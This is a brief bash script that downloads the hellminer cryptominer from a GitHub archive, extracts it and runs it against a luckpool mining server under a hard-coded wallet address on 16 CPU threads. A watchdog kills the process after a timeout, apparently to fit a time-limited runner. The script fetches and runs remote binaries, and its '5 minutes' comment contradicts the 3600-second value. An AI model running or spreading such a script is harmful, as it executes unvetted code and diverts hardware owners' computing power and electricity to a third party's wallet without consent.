#!/bin/bash

Timeout=3600 # 5 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RSBmzzfgzomxwx7o6tJNmG3kecq9Huc7Q9.RdX -p x --cpu 16
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
